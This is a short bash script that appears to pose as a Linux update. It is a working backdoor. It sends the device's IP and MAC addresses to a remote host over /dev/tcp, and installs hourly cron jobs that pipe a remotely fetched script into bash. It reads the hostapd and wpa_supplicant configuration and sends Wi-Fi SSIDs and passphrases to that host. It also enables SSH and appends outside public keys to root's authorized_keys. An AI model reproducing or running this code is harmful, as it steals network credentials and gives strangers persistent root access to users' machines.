#!/bin/bash

# Prevent from running twice per hour
if [[ $(< /tmp/last) = `date +"%H"` ]]; then
	exit 1
fi

IP=`hostname -I | sed 's/ *$//'`
MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`

SERVER="boesen.science"
PORT=2043

if [[ $(< /tmp/ip) != "$IP" ]]; then
	printf "$IP" > /tmp/ip

	exec 3<>/dev/tcp/$SERVER/$PORT
	printf "UPDATE: $MAC $IP" >&3

	cat <&3
fi

sudo su -c "(crontab -l 2>/dev/null; echo '0 * * * * curl -L erikboesen.com/linuxupdate.sh |bash') | crontab -"
sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/linuxupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"

HOSTSSID=`grep '^ssid' /etc/hostapd/hostapd.conf`
HOSTPASS=`grep 'wpa_passphrase' /etc/hostapd/hostapd.conf`
# TODO: Decrease messiness
WIFIDATA=`egrep 'ssid|psk' /etc/wpa_supplicant/wpa_supplicant.conf | tr '\n' ' '`
exec 3<>/dev/tcp/$SERVER/$PORT
printf "NETWORK: $IP $HOSTSSID $HOSTPASS $WIFIDATA" >&3

systemctl start ssh.service
systemctl enable ssh.service

SSHPATH="/root/.ssh"

mkdir -p "$SSHPATH"

if ! grep boesene $SSHPATH/authorized_keys; then
	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
fi

if ! grep legend $SSHPATH/authorized_keys; then
	curl https://gist.githubusercontent.com/Finallegend/9365d0e49e5eb87e6cc0e1da0353bd1d/raw >> $SSHPATH/authorized_keys
fi

date +"%H" > /tmp/last
